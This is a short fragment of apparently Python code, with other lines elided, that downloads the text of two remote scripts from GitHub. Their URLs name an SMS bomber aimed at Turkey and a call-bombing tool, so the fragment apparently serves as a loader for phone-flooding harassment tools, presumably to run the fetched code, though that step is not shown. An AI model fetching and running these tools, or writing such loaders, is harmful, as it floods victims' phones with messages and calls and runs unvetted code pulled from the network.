...
r = get("https://raw.githubusercontent.com/codzpen/sms-bomber-turkey-full/main/sms.py").text
...
r = get("https://raw.githubusercontent.com/cangvnn/Z-Bomb/main/call.py").text
